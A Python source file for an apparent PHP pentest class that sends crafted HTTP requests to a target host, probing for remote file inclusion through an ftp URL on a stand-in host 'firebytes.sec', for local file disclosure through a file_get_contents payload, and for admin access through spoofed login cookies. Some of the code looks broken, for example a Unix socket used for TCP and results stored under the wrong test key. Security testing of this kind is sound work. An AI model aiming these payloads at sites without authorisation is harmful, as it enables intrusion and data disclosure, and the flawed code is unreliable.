#!/usr/bin/env python
# *-* coding: utf-8 *-*

import sys
import re
import socket
import ssl
from datetime import datetime as dt

if sys.version_info[0] < 3:
    from logger import PrintLog
else:
    from sec_utils.logger import PrintLog

'''
\brief This is a basic PHP pentester script.

This class is used to test for common PHP exploits. These are all documented here:
https://www.exploit-db.com/papers/12871/

Exploit list:
    o  Remote file inclusion


The class should test for ALL of them and if any one of them doesn't pass, the class will FAIL.

If ANY of those fail, the class reports a SEC_FAILURE status.
'''
class SecPHP:
    SEC_SUCCESS = 0x0
    SEC_FAILURE = 0xccffccff
    SEC_UNTESTED = 0xffaaffaa

    m_result = SEC_UNTESTED

    m_testResults = {'remote_include': SEC_UNTESTED,
    'local_disclosure': SEC_UNTESTED,
    'cookies': SEC_UNTESTED}

    m_evilProto = "ftp"
    m_evilUrl = "firebytes.sec"

    # Exploit URIs
    m_remoteInclude = "fire_remote_include"

    def __init__(self, proto="ftp"):
        global PrintLog # Global functor for PrintLog

        self.m_evilProto = proto

        self.m_result = self.SEC_UNTESTED
        self.m_testResults['remote_include'] = self.SEC_UNTESTED 

        PrintLog("PHP Exploit tester ready.", "Info")

    '''
    \brief Test for remote file inclusion via $_POST and $_GET

    This function tests to see if we're able to include our own PHP via a remote call via $_POST or $_GET.

    \param[in] host - The hostname to attack.
    \param[in] uri - The URI to hit.
    \param[in] method - The method to use when performing the hit
    \param[in] variable - The variable to fill.

    \return True if remote fails, False if it succeeds.
    '''
    def InjectRemoteInclude(self, host, uri="/login", method="get", variable="username"):
        global PrintLog # Global functor for PrintLog

        bSuccess = False

        # Perform a pre-request for testing.
        lPrePage = self._Util_RetrievePage(host, uri="/index.php")

        # Format the request.
        htRequest = ""
        htValue = "{0}://{1}/{2}".format(self.m_evilProto, self.m_evilUrl, self.m_remoteInclude)

        if method == "post":
            htRequest = "{0} {1} HTTP/1.1\r\nHost: {4}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n\r\n{2}={3}\r\n".format(method.upper(), uri, variable, htValue, host)
        else:
            htRequest = "{0} {1}?{2}={3} HTTP/1.1\r\nHost: {4}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n\r\n".format(method.upper(), uri, variable, htValue, host)

        if 200 != self._Util_SendRequest(htRequest, host, useSSL=True)[0]:
            PrintLog("Site rejected injection: PASS!", "Success")
            self.m_result = self.SEC_SUCCESS
            self.m_testResults['remote_include'] = self.SEC_SUCCESS
            bSuccess = True
        else:
            PrintLog("Site has accepted request, testing to see if it had an effect.", "Debug")
            lPostPage = self._Util_RetrievePage(host, uri="/index.php")

            if lPrePage == lPostPage:
                PrintLog("Site rejected include code injection: PASS!", "Success")
                self.m_result = self.SEC_SUCCESS
                self.m_testResults['remote_include'] = self.SEC_SUCCESS
                bSuccess = True
            else:
                PrintLog("Site accepted and RAN include code injection: FAIL!", "Failure")
                self.m_result = self.SEC_FAILURE
                self.m_testResults['remote_include'] = self.SEC_FAILURE

        return bSuccess

    '''
    \brief Test for local file disclosure.

    This function will attempt to dump out the contents of a PHP file on the disk by injecting code into the $_GET/$_POST variables.

    \param[in] host - The hostname to attack.
    \param[in] uri - The URI to hit.
    \param[in] method - The method to use when performing the hit
    \param[in] variable - The variable to fill.
    \param[in] file_path - The injection value/file path to dump.

    \return True if remote fails, False if it succeeds.
    '''
    def DiscloseLocalFile(self, host, uri="/login", method="get", variable="username", file_path="file_get_contents('app.php') ?>"):
        global PrintLog # Global functor for PrintLog

        bSuccess = False

        htRequest = ""
        if method == "post":
            htRequest = "{0} {1} HTTP/1.1\r\nHost: {4}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n\r\n{2}={3}\r\n".format(method.upper(), uri, variable, file_path, host)
        else:
            htRequest = "{0} {1}?{2}={3} HTTP/1.1\r\nHost: {4}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n\r\n".format(method.upper(), uri, variable, file_path, host)

        lStatus, lHTML = self._Util_SendRequest(htRequest, host, useSSL=True)

        if 200 != lStatus:
            PrintLog("Site rejected injection: PASS!", "Success")
            self.m_result = self.SEC_SUCCESS
            self.m_testResults['local_disclosure'] = self.SEC_SUCCESS
            bSuccess = True
        else:
            PrintLog("Site has accepted request, testing to see if it had an effect.", "Debug")

            if not re.match('^<\?php.*', lHTML, re.IGNORECASE):
                PrintLog("Site rejected disclosure injection: PASS!", "Success")
                self.m_result = self.SEC_SUCCESS
                self.m_testResults['local_disclosure'] = self.SEC_SUCCESS
                bSuccess = True
            else:
                PrintLog("Site accepted and RAN disclosure injection: FAIL!", "Failure")
                self.m_result = self.SEC_FAILURE
                self.m_testResults['local_disclosure'] = self.SEC_FAILURE

        return bSuccess

    '''
    \brief Attempt to spoof cookies and inject custom cookies.

    This function will query a provided URI and attempt to spoof cookie values to gain access to the provided secure URI.

    \param[in] host - The hostname to attack.
    \param[in] uri - The URI to grab cookies from.
    \param[in] secure_uri - THe URI to test against.

    \return True if the cookies can't be spoofed, False if the cookies are successfully spoofed.
    '''
    def SpoofCookies(self, host, uri="/login", secure_uri="admin"):
        global PrintLog # Global functor for PrintLog

        bSuccess = False

        # Grab the headers of the URI.
        lHeaders = self._Util_GetHeaders(uri, host, useSSL=True)
        lCookies = ""

        htRequest = "GET {0} HTTP/1.1\r\nHost: {1}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n".format(secure_uri, host)

        for field in lHeaders:
            if re.match('^Cookie:\s(.*)$', field, re.IGNORECASE):
                lCookies = re.search('^Cookie:\s(.*)$', field, re.IGNORECASE).group(1)
                break

        if lCookies != "":
            lCookies = lCookies.split(";")

            # Scrape through the cookies and look for "login".
            for cookie in lCookies:
                lKey = cookie.split("=")[0]
                lValue = cookie.split("=")[1]

                if re.match('.*login.*', lKey, re.IGNORECASE):
                    # Inspect the value and attempt a spoof.
                    if re.match('^(0|1)$', lValue, re.IGNORECASE):
                        htRequest = "{0}Cookie: {1}={2};\r\n\r\n".format(htRequest, lKey, "1")
                    elif re.match('^(t(rue)?|f(alse)?)$', lValue, re.IGNORECASE):
                        htRequest = "{0}Cookie: {1}={2};\r\n\r\n".format(htRequest, lKey, "true")
                    else:
                        htRequest = ""

            if htRequest != "":
                # Attempt the query!
                if 200 != self._Util_SendRequest(htRequest, host, useSSL=True)[0]:
                    PrintLog("Site rejected cookie spoof injection: PASS!", "Success")
                    self.m_result = self.SEC_SUCCESS
                    self.m_testResults['remote_include'] = self.SEC_SUCCESS
                    bSuccess = True
                else:
                    PrintLog("Site accepted and RAN cookie spoof injection: FAIL!", "Failure")
                    self.m_result = self.SEC_FAILURE
                    self.m_testResults['remote_include'] = self.SEC_FAILURE

        else:
            PrintLog("Not able to test cookie spoofing as there are no cookies! Defaulting to SUCCESS", "Success")
            self.m_result = self.SEC_SUCCESS
            self.m_testResults['cookies'] = self.SEC_SUCCESS
            bSuccess = True

        return bSuccess

    '''
    \brief This function perfoms a simple HTTP GET to retrieve a page like a browser would.
    \return HTML data (if any) retrieved.
    '''
    def _Util_RetrievePage(self, host, uri="/app.php"):
        statusCode, htData = self._Util_SendRequest("GET {0} HTTP/1.1\r\nHost: {1}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n\r\n".format(uri, host), host, useSSL=True)

        return htData

    '''
    \brief Make an HTTP request on a socket (possibly secure).

    This function will preform an HTTP(S) request and return both the status code and data in a tuple.

    \param[in] headers - HTTP headers to send.
    \param[in] host - THe hostname to connect to.
    \param[in] useSSL - Should SSL be used? (default: False)

    \return tuple containing the HTTP status code and data (status, html)
    '''
    def _Util_SendRequest(self, headers, host, useSSL=False):
        global PrintLog # Global functor for PrintLog

        lStatus = 404
        lHTML = ""

        mData = ""
        if headers != "":
            if useSSL == True:
                try:
                    sslContext = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
                    sslContext.options |= ssl.OP_NO_SSLv2
                    sslContext.options |= ssl.OP_NO_SSLv3
                    sslContext.load_default_certs()
                    sslContext.verify_mode = ssl.CERT_REQUIRED
                    sslContext.check_hostname = True
                    
                    sslConn = sslContext.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
                    sslConn.connect((host, 443))

                    sslConn.sendall(headers)

                    lOldSz = 0
                    lNewSz = 1
                    while (lNewSz - lOldSz) > 0:
                        lOldSz = lNewSz
                        mData += sslConn.recv(65535)
                        lNewSz = len(mData) - lOldSz

                    sslConn.close()

                except (IOError, OSError, socket.error, ssl.SSLError) as err:
                    PrintLog("{0} \033[1;34m{1}\033[0m".format(err, type(err)), "Fatal")
                    sys.exit(255)
            else:
                try:
                    httpSock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                    httpSock.connect((host, 80))

                    httpSock.sendall(headers)

                    lOldSz = 0
                    lNewSz = 1
                    while (lNewSz - lOldSz) > 0:
                        lOldSz = lNewSz
                        mData += httpSock.recv(65535)
                        lNewSz = len(mData) - lOldSz

                    httpSock.close()
                except (IOError, OSError, socket.error, ssl.SSLError) as err:
                    PrintLog("{0} \033[1;34m{1}\033[0m".format(err, type(err)), "Fatal")
                    sys.exit(255)
            
            # Parse the data.
            if re.match('^HTTP\/[0-9]\.[0-9]\s([0-9]{3})\s.*', mData, re.IGNORECASE):
                lRegExp = re.search('^HTTP\/[0-9]\.[0-9]\s([0-9]{3})\s.*\r\n\r\n(.*)$', mData)

                if lRegExp != None:
                    lStatus = lRegExp.group(1)
                    lHTML = lRegExp.group(2)
            else:
                PrintLog("Was unable to parse HTTP return!", "Critical")
                sys.exit(255)

        return (lStatus, lHTML)

    '''
    \brief Make an HTTP request on a socket (possibly secure).

    This function will perform an HTTP(S) request and return the headers of the response as a list of fields.

    \param[in] location - Location to grab headers from.
    \param[in] host - THe hostname to connect to.
    \param[in] useSSL - Should SSL be used? (default: False)

    \return list of the header fields.
    '''
    def _Util_GetHeaders(self, location, host, useSSL=False):
        global PrintLog # Global functor for PrintLog

        htHeaders = "HEAD {0} HTTP/1.1\r\nHost: {1}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n\r\n".format(location, host)

        mData = ""
        if htHeaders != "":
            if useSSL == True:
                try:
                    sslContext = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
                    sslContext.options |= ssl.OP_NO_SSLv2
                    sslContext.options |= ssl.OP_NO_SSLv3
                    sslContext.load_default_certs()
                    sslContext.verify_mode = ssl.CERT_REQUIRED
                    sslContext.check_hostname = True
                    
                    sslConn = sslContext.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
                    sslConn.connect((host, 443))

                    sslConn.sendall(htHeaders)

                    lOldSz = 0
                    lNewSz = 1
                    while (lNewSz - lOldSz) > 0:
                        lOldSz = lNewSz
                        mData += sslConn.recv(65535)
                        lNewSz = len(mData) - lOldSz

                    sslConn.close()

                except (IOError, OSError, socket.error, ssl.SSLError) as err:
                    PrintLog("{0} \033[1;34m{1}\033[0m".format(err, type(err)), "Fatal")
                    sys.exit(255)
            else:
                try:
                    httpSock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                    httpSock.connect((host, 80))

                    httpSock.sendall(htHeaders)

                    lOldSz = 0
                    lNewSz = 1
                    while (lNewSz - lOldSz) > 0:
                        lOldSz = lNewSz
                        mData += httpSock.recv(65535)
                        lNewSz = len(mData) - lOldSz

                    httpSock.close()
                except (IOError, OSError, socket.error, ssl.SSLError) as err:
                    PrintLog("{0} \033[1;34m{1}\033[0m".format(err, type(err)), "Fatal")
                    sys.exit(255)

        return mData.split("\r\n")
